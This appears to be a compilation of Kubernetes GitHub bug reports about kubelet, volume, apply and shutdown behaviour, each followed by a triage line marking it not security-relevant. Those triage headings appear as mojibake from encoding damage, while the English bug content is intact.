Mar 24 16:16:37 gke-[snip]-bbzn kubelet[4021733]: I0324 16:16:37.047682 4021733 state_mem.go:107] "Deleted CPUSet assignment" podUID="44a879b9-bd14-43ec-8d23-730abcb24f60" containerName="an-sts-pod"
```

After that, it seems wedged. The `kubelet` appears to never attempt to restart the pod, despite the restart policy.

#### What did you expect to happen?

The `StatefulSet` controller to restart the pod, or the `kubelet` to restart the pod; I'm not clear which of these two would be responsible.

#### How can we reproduce it (as minimally and precisely as possible)?

I'm not clear on what gets me into this situation.

#### Anything else we need to know?

There's an old SO thread out there that claims that Docker restarts cause this. That bug seems to be in an utterly ancient version (1.x) of Docker; I am past the fixed version for that bug.

Regardless, I checked the logs for `docker`; the Docker daemon does not appear to have restarted when the pod died.

Shortly prior to the `Finished` timestamp, Cloud Logs indicate that the node that pod was on was under Memory Pressure. Presumably, it terminated that pod due to that, but nonetheless, I would expect it to then get evicted.

#### Kubernetes version

```console
$ kubectl version
Server Version: v1.27.7-gke.1121002
```


#### Cloud provider

GCP, GKE

#### OS version

<details>

```console
# On Linux:
# cat /etc/os-release
NAME="Container-Optimized OS"
ID=cos
PRETTY_NAME="Container-Optimized OS from Google"
HOME_URL="https://cloud.google.com/container-optimized-os/docs"
BUG_REPORT_URL="https://cloud.google.com/container-optimized-os/docs/resources/support-policy#contact_us"
GOOGLE_CRASH_ID=Lakitu
GOOGLE_METRICS_PRODUCT_ID=26
KERNEL_COMMIT_ID=37c79a2c2008543e2c9a5dc749faa91fb0d806b5
VERSION=105
VERSION_ID=105
BUILD_ID=17412.226.62
# paste output here
# uname -a
Linux gke-[snip] 5.15.133+ #1 SMP Sat Dec 30 13:01:38 UTC 2023 x86_64 Intel(R) Xeon(R) CPU @ 2.20GHz GenuineIntel GNU/Linux
```

</details>


#### Install tools

N/A

#### Container runtime (CRI) and version (if applicable)

`containerd://1.7.10`


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

(Dunno.)


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124058 Failed to watch *v1.Service: failed to list *v1.Service

- Issue é“¾æ¥ï¼š[#124058](https://github.com/kubernetes/kubernetes/issues/124058)

### Issue å†…å®¹

#### What happened?

Installation Debian 12. Prestine, no additional configurations were done to the system aside from installing kubernetes.
For a detailed setup please see https://github.com/kubernetes/kubernetes/issues/123959
CRI containerd 1.6
 cluster is not responsive.
kubectl fails.
This is directly related to 

#### What did you expect to happen?

Cluster is healthy. `kubectl get pods` is returning without an error.

#### How can we reproduce it (as minimally and precisely as possible)?

Please see https://github.com/kubernetes/kubernetes/issues/123959

#### Anything else we need to know?

No OOM event occurred.
No configurations other than providing software to run kubernetes (see related issue) happened.
No explicit manual alterations have been done to the firewall.

[log_without_time.txt](https://github.com/kubernetes/kubernetes/files/14757788/log_without_time.txt)
[iptables.txt](https://github.com/kubernetes/kubernetes/files/14757796/iptables.txt)


#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124057 NewVolumeManagerReconstruction: Volumes are reported as unmounted after reboot

- Issue é“¾æ¥ï¼š[#124057](https://github.com/kubernetes/kubernetes/issues/124057)

### Issue å†…å®¹

#### What happened?

Kubernetes 1.27 with `NewVolumeManagerReconstruction` feature gate **enabled** and `SELinuxMountReadWriteOncePod` **disabled**, a rebooted node is not able to re-start pods that were running there before the reboot.

The node reports in Pod events:

```
Warning  FailedMount             2m4s (x5 over 11m)  kubelet                  Unable to attach or mount volumes: unmounted volumes=[myvol], unattached volumes=[], failed to process volumes=[]: timed out waiting for the condition
```

#### What did you expect to happen?

The Pod should start just fine.

#### How can we reproduce it (as minimally and precisely as possible)?

On Kubernetes 1.27:
1. Enable NewVolumeManagerReconstruction feature gate.
2. Run a StatefulSet that uses a volume.
3. Force-reboot the node which runs the StatefulSet Pod.

#### Anything else we need to know?

The reason is that kubelet's VolumeManager reconstructs the volume as _uncertain_ during startup and it uses a provisional _outer volume name_ for it, because it has not seen the API server and Pods in it yet. This provisional volume ID is then used in ActualStateOfWorld forever.

While kubelet _does_ mount the volume after reboot, it's not able to match it with the Pod that needs it. Kubelet reports `unmounted volumes=[myvol]`, while the volume is mounted with ID `pvc-6357c1ec-bac1-45fd-822f-2d6a014a9721` in my case (= the provisional name, we use PV.name for it) and not `myvol` (=`pod.spec.volumes[*].name`).

It is not reproducible with `SELinuxMountReadWriteOncePod` enabled.

#### Kubernetes version

<details>

```console
$ kubectl version
Server Version: version.Info{Major:"1", Minor:"27+", GitVersion:"v1.27.1-3530+d715b057d9767f-dirty", GitCommit:"d715b057d9767fd7b9ea4792888e3336e1b36ed1", GitTreeState:"dirty", BuildDate:"2024-03-26T08:51:59Z", GoVersion:"go1.20.12 X:strictfipsruntime", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
AWS + AWS EBS CSI driver, but it should not be relevant.
</details>


#### OS version

<details>

```console
PRETTY_NAME="Red Hat Enterprise Linux CoreOS 414.92.202403251839-0 (Plow)"
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124054 K8s workers NotReady, Kubelet stopped posting node status, kubelet service log "Error getting node" err="node \"workernode\" not found" "failed to ensure lease exists"

- Issue é“¾æ¥ï¼š[#124054](https://github.com/kubernetes/kubernetes/issues/124054)

### Issue å†…å®¹

#### What happened?

All of our cluster's worker has gone NotReady status. 
![image](https://github.com/kubernetes/kubernetes/assets/81574913/e25eb4c1-0197-425d-bfc9-472370c8dc26)
![image](https://github.com/kubernetes/kubernetes/assets/81574913/4b68edb2-befd-43c7-b64b-2205f64d73f0)

Inspecting one of the workers kubelet log shows below 

![image](https://github.com/kubernetes/kubernetes/assets/81574913/87ea659f-5f95-49d9-832d-9a41996e2678)


#### What did you expect to happen?

Workers to be working fine as usual.

#### How can we reproduce it (as minimally and precisely as possible)?

Not sure.

#### Anything else we need to know?

A week ago we got an error X509: Certificate Has Expired Or Is Not Yet Valid, we updated the certificate using kubeadm certs renew all and it is working fine

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
Client Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.12", GitCommit:"b058e1760c79f46a834ba59bd7a3486ecf28237d", GitTreeState:"clean", BuildDate:"2022-07-13T14:59:18Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.12", GitCommit:"b058e1760c79f46a834ba59bd7a3486ecf28237d", GitTreeState:"clean", BuildDate:"2022-07-13T14:53:39Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
On premises machine
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
PRETTY_NAME="Ubuntu 22.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.1 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
- Containerd v1.5.9-0
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
#### ackage Info
- kubernetes v1.22.12
- keepalived v2.2.4
- haproxy v

#### Kubernetes Services Version

- Calico v3.21
- Kubeflow v1.6
</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124052 ResourceQuota error message typo

- Issue é“¾æ¥ï¼š[#124052](https://github.com/kubernetes/kubernetes/issues/124052)

### Issue å†…å®¹

#### What happened?

On the document, the operator should be 'Exists'


![ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆ 2024-03-26 æ˜¼3 35 18](https://github.com/kubernetes/kubernetes/assets/600238/c180e7a0-b080-41c6-afb9-56e2e6101465)

But in the Error message, it becomes 'Exist'
```
Invalid value: "Exist": must be 'Exist' when scope is any of ResourceQuotaScopeTerminating, ResourceQuotaScopeNotTerminating, ResourceQuotaScopeBestEffort, ResourceQuotaScopeNotBestEffort or ResourceQuotaScopeCrossNamespacePodAffinity
```
![ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚·ãƒ§ãƒƒãƒˆ 2024-03-26 æ˜¼3 36 09](https://github.com/kubernetes/kubernetes/assets/600238/267e3126-13e0-4d0f-93c9-7a2a41491274)



#### What did you expect to happen?

the error message should be 
```
Invalid value: "Exist": must be 'Exists' when scope is any of ResourceQuotaScopeTerminating, ResourceQuotaScopeNotTerminating, ResourceQuotaScopeBestEffort, ResourceQuotaScopeNotBestEffort or ResourceQuotaScopeCrossNamespacePodAffinity
```

#### How can we reproduce it (as minimally and precisely as possible)?

create a yaml and apply it
```
apiVersion: v1
kind: ResourceQuota
metadata:
  name: user-quota
spec:
  hard:
    pods: "200"
    requests.cpu: "4"
    requests.memory: 4Gi
    limits.cpu: "1200"
    limits.memory: 8Gi
  scopeSelector:
    matchExpressions:
      - scopeName: CrossNamespacePodAffinity
        operator: Exist
```


#### Anything else we need to know?

It's my first time, I am not sure should we change `ResourceQuotaScopeTerminating` to `Terminating`?

#### Kubernetes version

<details>

```console
$ kubectl version
WARNING: This version information is deprecated and will be replaced with the output from kubectl version --short.  Use --output=yaml|json to get the full version.
Client Version: version.Info{Major:"1", Minor:"24", GitVersion:"v1.24.11+k3s1", GitCommit:"c14436a9ecfffb3be553a06bb0a4fac6122579ce", GitTreeState:"clean", BuildDate:"2023-03-10T22:03:01Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v4.5.4
Server Version: version.Info{Major:"1", Minor:"24", GitVersion:"v1.24.11+k3s1", GitCommit:"c14436a9ecfffb3be553a06bb0a4fac6122579ce", GitTreeState:"clean", BuildDate:"2023-03-10T22:03:01Z", GoVersion:"go1.19.6", Compiler:"gc", Platform:"linux/amd64"}
```


</details>


#### Cloud provider

<details>
K3S
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux mbvm230702 5.15.0-94-generic #104-Ubuntu SMP Tue Jan 9 15:25:40 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124050 Server-side apply has trouble with empty map

- Issue é“¾æ¥ï¼š[#124050](https://github.com/kubernetes/kubernetes/issues/124050)

### Issue å†…å®¹

#### What happened?

Every time I server-side apply a `Deployment` with `spec.template.metadata.annotations: {}`, the `resourceVersion` updates. Nothing about my manifest changes between applies; if I map `annotations` to the empty map, `kubectl apply --server-side` the same manifest updates the `resourceVersion`. With client-side apply, the `resourceVersion` stays the same as long as my manifest remains constant, even if `annotations: {}`.

I read in #70281 that Kubernetes should treat absent keys, empty values (in this case, an empty map), and `null` values the same. I observe that leaving the `annotations` key out and `annotations: null` behave as expected, not modifying the `Deployment` and leaving `resourceVersion` the same, but empty map `{}` behaves as described above.

If we cannot change this behavior, I'd at least like to understand the rationale behind it.

#### What did you expect to happen?

I expected my `Deployment` object to stay the same between identical server-side applies, where the manifest file content was exactly the same, regardless of the value of `spec.template.metadata.annotations`. A different `resourceVersion` every apply indicates that the object was event type `MODIFIED`. I expect no events to fire on applying the same manifest.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Say `deployment.yaml` contains https://kubernetes.io/docs/concepts/workloads/controllers/deployment/#creating-a-deployment. In actuality, any `Deployment` is fine.
2. Add `spec.template.metadata.annotatations: {}`.
3. `kubectl apply --server-side deployment.yaml`
4. `kubectl get deployment nginx-deployment -o yaml`

Every successive repeat of steps 3-4 should show different `metadata.resourceVersion` values.

Example of `Deployment` with `spec.template.metadata.annotatations: {}`:
```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
  labels:
    app: nginx
spec:
  replicas: 3
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      annotations: {}
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx:1.14.2
        ports:
        - containerPort: 80
```

#### Anything else we need to know?

This is especially a problem when I server-side apply with code in my operator. My operator is built on https://github.com/kubernetes-sigs/kubebuilder-declarative-pattern and watches changes to the child objects it deploys. If I create a `Deployment` with `spec.template.metadata.annotations: {}`, the operator constantly reconciles because every server-side apply of the manifest registers as a type `MODIFIED` event on the object, which triggers the watching operator to reconcile.

#### Kubernetes version

```console
$ kubectl version --short
Client Version: v1.27.11
Kustomize Version: v5.0.1
Server Version: v1.27.8-gke.1067004
```


#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
ID=debian
$ uname -a
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠã€‚

---

## Issue #124046 1.30 Release Notes: "Known Issues"

- Issue é“¾æ¥ï¼š[#124046](https://github.com/kubernetes/kubernetes/issues/124046)

### Issue å†…å®¹

#### What happened?

This issue is a bucket placeholder for collaborating on the "Known Issues" additions for the 1.30 Release Notes. If you know of issues or API changes that are going out in 1.30, please comment here so that we can coordinate incorporating information about these changes in the Release Notes.

/assign @kubernetes/release-team-release-notes

/sig release
/milestone v1.30

### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124043 DRA: kubelet: crash when plugin returns nil UnprepareResourceResponse

- Issue é“¾æ¥ï¼š[#124043](https://github.com/kubernetes/kubernetes/issues/124043)

### Issue å†…å®¹

#### What happened?

protobuf doesn't require that objects get encoded when they are empty. This can lead to a nil pointer in https://github.com/kubernetes/kubernetes/issues/124042 (although that's probably an error because some information is needed) and in https://github.com/kubernetes/kubernetes/blob/20d0ab7ae808aaddb1556c3c38ca0607663c50ac/staging/src/k8s.io/kubelet/pkg/apis/dra/v1alpha3/api.pb.go#L255 (happened in practice).

The result is a crash of kubelet:
```
E0305 14:50:50.162844   10432 runtime.go:79] Observed a panic: "invalid memory address or nil pointer dereference" (runtime error: invalid memory address or nil pointer dereference)
goroutine 883 [running]:
k8s.io/apimachinery/pkg/util/runtime.logPanic({0x3de2d20?, 0x6fc0d90})
	/go/src/kubernetes/vendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:75 +0x85
k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x0, 0x0, 0x0?})
	/go/src/kubernetes/vendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:49 +0x6b
panic({0x3de2d20?, 0x6fc0d90?})
	/usr/local/go/src/runtime/panic.go:914 +0x21f
k8s.io/kubernetes/pkg/kubelet/cm/dra.(*ManagerImpl).UnprepareResources(0xc00097b998, 0xc000d48900)
	/go/src/kubernetes/pkg/kubelet/cm/dra/manager.go:375 +0x67c
k8s.io/kubernetes/pkg/kubelet/cm.(*containerManagerImpl).UnprepareDynamicResources(0xc00027f5c0?, 0x477a71c?)
	/go/src/kubernetes/pkg/kubelet/cm/container_manager_linux.go:1021 +0x22
k8s.io/kubernetes/pkg/kubelet.(*Kubelet).UnprepareDynamicResources(...)
	/go/src/kubernetes/pkg/kubelet/kubelet.go:3055
k8s.io/kubernetes/pkg/kubelet.(*Kubelet).SyncTerminatingPod(0xc0004e3000, {0xc0010b2510?, 0x24?}, 0xc000d48900, 0xed8569a108?, 0x0, 0x0)
	/go/src/kubernetes/pkg/kubelet/kubelet.go:2082 +0x1a0b
k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop.func1({0x1, {0x0, {0x0, 0x0, 0x0}, 0xc000d48900, 0x0, 0x0, 0x0}}, 0xc0004c4dc0, ...)
	/go/src/kubernetes/pkg/kubelet/pod_workers.go:1279 +0x17d
k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop(0xc0010b2510?, {0xc0010b2510, 0x24}, 0x0?)
	/go/src/kubernetes/pkg/kubelet/pod_workers.go:1288 +0x47b
k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod.func1()
	/go/src/kubernetes/pkg/kubelet/pod_workers.go:950 +0x115
created by k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod in goroutine 230
	/go/src/kubernetes/pkg/kubelet/pod_workers.go:945 +0x221b
panic: runtime error: invalid memory address or nil pointer dereference [recovered]
	panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x8 pc=0x209f8bc]

goroutine 883 [running]:
k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x0, 0x0, 0x0?})
	/go/src/kubernetes/vendor/k8s.io/apimachinery/pkg/util/runtime/runtime.go:56 +0xcd
panic({0x3de2d20?, 0x6fc0d90?})
	/usr/local/go/src/runtime/panic.go:914 +0x21f
k8s.io/kubernetes/pkg/kubelet/cm/dra.(*ManagerImpl).UnprepareResources(0xc00097b998, 0xc000d48900)
	/go/src/kubernetes/pkg/kubelet/cm/dra/manager.go:375 +0x67c
k8s.io/kubernetes/pkg/kubelet/cm.(*containerManagerImpl).UnprepareDynamicResources(0xc00027f5c0?, 0x477a71c?)
	/go/src/kubernetes/pkg/kubelet/cm/container_manager_linux.go:1021 +0x22
k8s.io/kubernetes/pkg/kubelet.(*Kubelet).UnprepareDynamicResources(...)
	/go/src/kubernetes/pkg/kubelet/kubelet.go:3055
k8s.io/kubernetes/pkg/kubelet.(*Kubelet).SyncTerminatingPod(0xc0004e3000, {0xc0010b2510?, 0x24?}, 0xc000d48900, 0xed8569a108?, 0x0, 0x0)
	/go/src/kubernetes/pkg/kubelet/kubelet.go:2082 +0x1a0b
k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop.func1({0x1, {0x0, {0x0, 0x0, 0x0}, 0xc000d48900, 0x0, 0x0, 0x0}}, 0xc0004c4dc0, ...)
	/go/src/kubernetes/pkg/kubelet/pod_workers.go:1279 +0x17d
k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop(0xc0010b2510?, {0xc0010b2510, 0x24}, 0x0?)
	/go/src/kubernetes/pkg/kubelet/pod_workers.go:1288 +0x47b
k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod.func1()
	/go/src/kubernetes/pkg/kubelet/pod_workers.go:950 +0x115
created by k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod in goroutine 230
	/go/src/kubernetes/pkg/kubelet/pod_workers.go:945 +0x221b
```

(from 1.29.1).

#### What did you expect to happen?

No crash.

#### How can we reproduce it (as minimally and precisely as possible)?

Run the DRA-enabled Akri plugin.

#### Anything else we need to know?

Reported by @diconico07 in https://kubernetes.slack.com/archives/C0BP8PW9G/p1709647270084129

#### Kubernetes version

Several, but we shouldn't (?) backport because it was alpha.


#### Cloud provider

n/a

#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124039 GracefulNodeShutdown does not trigger on nodes shutdown with `shutdown -h now`

- Issue é“¾æ¥ï¼š[#124039](https://github.com/kubernetes/kubernetes/issues/124039)

### Issue å†…å®¹

#### What happened?

Shutting down a node with `shutdown -h now` does not trigger the graceful node drain. 

Despite being indicated in the original proposal
https://github.com/kubernetes/enhancements/tree/master/keps/sig-node/2000-graceful-node-shutdown

> In the context of this KEP, shutdown is referred to as shutdown of the underlying machine. On most linux distros shutdown can be initiated via a variety of methods for example:
>
> 1. shutdown -h now
> 2. shutdown -h +30 #schedule a delayed shutdown in 30mins

and explained in the blog:
https://kubernetes.io/blog/2021/04/21/graceful-node-shutdown-beta/

> How does it work?
> On Linux, your system can shut down in many different situations. For example:
>
> - A user or script running shutdown -h now or systemctl poweroff or systemctl reboot.

the command seems to not behave the same way as sending a PrepareForShutdown signal on the dbus.

The node does not drain itself from its pods and pods will stay Running until timeout and it becomes stuck at Terminating 

On the other hand, `shutdown -h now` acts similarly as a forced shutdown and as I understand, a forced shutdown on a node doesn't allow a grace period as it is forced; so one can argue that there is nothing wrong with the behavior. However, the need to clarify the documentation on what counts as a shutdown that can trigger GracefulNodeShutdown may be helpful.

#### What did you expect to happen?

Expecting a similar behavior as if executing
`# systemctl poweroff`
or
`#dbus-send --system /org/freedesktop/login1 org.freedesktop.login1.Manager.PrepareForShutdown boolean:true`

where the graceful node drain occurs and terminates the pods.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Start a cluster with kubeadm init with this config. I use 2 worker nodes by default but can be reproduced with 1.
```
apiVersion: kubeadm.k8s.io/v1beta3
kind: ClusterConfiguration
networking:
  podSubnet: "10.244.0.0/16"  #flannel
controlPlaneEndpoint: "XXX.XXX.XXX.XXX"
---
apiVersion: kubelet.config.k8s.io/v1beta1
cgroupDriver: systemd
featureGates:
  GracefulNodeShutdown: true
shutdownGracePeriod: 90s
shutdownGracePeriodCriticalPods: 30s
kind: KubeletConfiguration                   
```
2.  Make a deployment or a statefulset; I used this statefulset config in my environment: https://github.com/kubernetes/kubernetes/issues/118310#issuecomment-1698823460

3. Monitor the pods on a terminal logged SSHed the control plane:

`kubectl get pods --watch`

4. On a terminal logged in a worker node, execute shutdown with the following command:

`shutdown -h now`

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```
tested on kubernetes versions 1.26, 1.27, 1.28, 1.29
```

</details>


#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="CentOS Stream"
VERSION="8"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="8"
PLATFORM_ID="platform:el8"
PRETTY_NAME="CentOS Stream 8"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:8"
HOME_URL="https://centos.org/"
BUG_REPORT_URL="https://bugzilla.redhat.com/"
REDHAT_SUPPORT_PRODUCT="Red Hat Enterprise Linux 8"
REDHAT_SUPPORT_PRODUCT_VERSION="CentOS Stream"
$ uname -a
Linux localhost.localdomain 4.18.0-544.el8.x86_64 #1 SMP Thu Feb 22 21:29:23 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #124016 node should not be ready when klog flush deamon in kubelet is block in fsync

- Issue é“¾æ¥ï¼š[#124016](https://github.com/kubernetes/kubernetes/issues/124016)

### Issue å†…å®¹

#### What happened?

1. some issues cause a part of  fsync syscalls to persist in blocking
2. klog flush deamon hold the lock, call `flushAll` and block in fsync syscall 

https://github.com/kubernetes/kubernetes/blob/a309fadbac3339bc8db9ae0a928a33b8e81ef10f/vendor/k8s.io/klog/v2/klog.go#L1223-L1228

4. other goroutines in kubelet will be block when print log
https://github.com/kubernetes/kubernetes/blob/a309fadbac3339bc8db9ae0a928a33b8e81ef10f/vendor/k8s.io/klog/v2/klog.go#L885-L894

5. kubelet can renew node lease normally because this goroutine do not print log
6. node controller think this node is ready

#### What did you expect to happen?

node should be not ready

#### How can we reproduce it (as minimally and precisely as possible)?

maybe use ptrace to block fsync?

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.26.0
<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

none
<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123992 strictARP Configuration in kube-proxy (IPVS Mode) Does Not Revert sysctl Parameters on Setting to false

- Issue é“¾æ¥ï¼š[#123992](https://github.com/kubernetes/kubernetes/issues/123992)

### Issue å†…å®¹

#### What happened?

When `strictARP` is set to `true` in kube-proxy's configuration for IPVS mode, kube-proxy modifies certain `sysctl` parameters as expected. However, if the `strictARP` is later changed to `false`, the modified `sysctl` parameters are not reverted to their original values.

Upon inspecting the source code, I noticed that there is logic to apply changes when `strictARP` is `true`, but there appears to be no corresponding logic to revert these changes when `strictARP` is set to `false`.

#### What did you expect to happen?

revert

#### How can we reproduce it (as minimally and precisely as possible)?

master branch

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠã€‚

---

## Issue #123989 GKE schedules pods that prevent scale down

- Issue é“¾æ¥ï¼š[#123989](https://github.com/kubernetes/kubernetes/issues/123989)

### Issue å†…å®¹

#### What happened?

Original issue was closed for no reason: #69696 

GKE still schedules all kinds of pods that prevent scaledown

#### What did you expect to happen?

Pods not to prevent scaledown

#### How can we reproduce it (as minimally and precisely as possible)?

Run a cluster and try to scaledown after scaleup

#### Anything else we need to know?

_No response_

#### Kubernetes version

since 2018 until today

#### Cloud provider

Google

#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123980 restarting a kubelet should never affect the running workload

- Issue é“¾æ¥ï¼š[#123980](https://github.com/kubernetes/kubernetes/issues/123980)

### Issue å†…å®¹

#### What happened?

1.Node label changed.
Node label changed is because the operation and maintenance engineer organized the node label, such as hpc=true, and removed this label. When a pod is compatible with this label, restarting the node kubelet will cause the pod to be rebuilt. This actually shouldnâ€™t be the case. It will affect the normal operation of the business.
2.https://github.com/kubernetes/kubernetes/issues/123971
3.https://github.com/kubernetes/kubernetes/issues/123816
After the above three scenarios occur, as long as the kubelet is restarted, the pod will be evicted. Obviously, this is not as expected. It is also an undesirable result for online business.

#### What did you expect to happen?

Restarting a kubelet should not cause any disruption to the running workload (which likely will mean skip admission of running pods, but let's not run ahead of ourselves) and backlink to this issue is probably the best way forward still.

#### How can we reproduce it (as minimally and precisely as possible)?

Before restarting the kubelet, fully check the scenarios mentioned above.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```
Client Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.17", GitCommit:"a7736eaf34d823d7652415337ac0ad06db9167fc", GitTreeState:"clean", BuildDate:"2022-12-08T11:47:36Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.17", GitCommit:"a7736eaf34d823d7652415337ac0ad06db9167fc", GitTreeState:"clean", BuildDate:"2022-12-08T11:42:04Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123971 pod with initcontainer failed with UnexpectedAdmissionError when restart kubelet

- Issue é“¾æ¥ï¼š[#123971](https://github.com/kubernetes/kubernetes/issues/123971)

### Issue å†…å®¹

#### What happened?

Memory manager have bug, restart kubelet (do not delete any checkpoint file ), pod with init-container will failed.

#### What did you expect to happen?

Pod A and Pod B is still running.

